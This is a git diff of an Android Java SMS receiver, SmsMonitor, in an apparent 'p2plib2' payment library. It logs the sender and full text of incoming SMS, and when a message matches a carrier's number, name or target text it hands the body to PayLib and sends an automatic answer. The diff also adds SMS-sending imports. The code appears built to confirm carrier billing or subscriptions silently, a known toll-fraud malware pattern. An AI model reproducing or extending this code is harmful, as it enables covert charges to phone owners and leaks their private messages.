@@ -1,19 +1,20 @@
 package  com.p2plib2.sms;
 
+import android.app.Activity;
+import android.app.PendingIntent;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Telephony;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 
 import com.p2plib2.Logger;
 import com.p2plib2.PayLib;
 
 import static com.p2plib2.PayLib.operatorSMS;
-import static com.p2plib2.PayLib.operatorUssd;
-
 
 public class SmsMonitor extends BroadcastReceiver {
 
@@ -52,11 +53,10 @@ public class SmsMonitor extends BroadcastReceiver {
                 }
             }
             Logger.lg("sender " + smsSender + " " + operatorSMS.smsNum + " " + operatorSMS.smsNum.contains(smsSender)  + "  smsBody.contains(operatorSMS.target) " +  smsBody.contains(operatorSMS.target)
-                    +"body  " + smsBody +" status " + status
+            +"body  " + smsBody +" status " + status
             );
             if (operatorSMS.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorSMS.name)
-                    || smsBody.contains(operatorSMS.target)
-                    || operatorUssd.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorUssd.name)) {
+                    || smsBody.contains(operatorSMS.target)) {
                 PayLib.getSMSResult(smsBody);
                 PayLib.sendAnswer(smsBody, smsSender);
             }
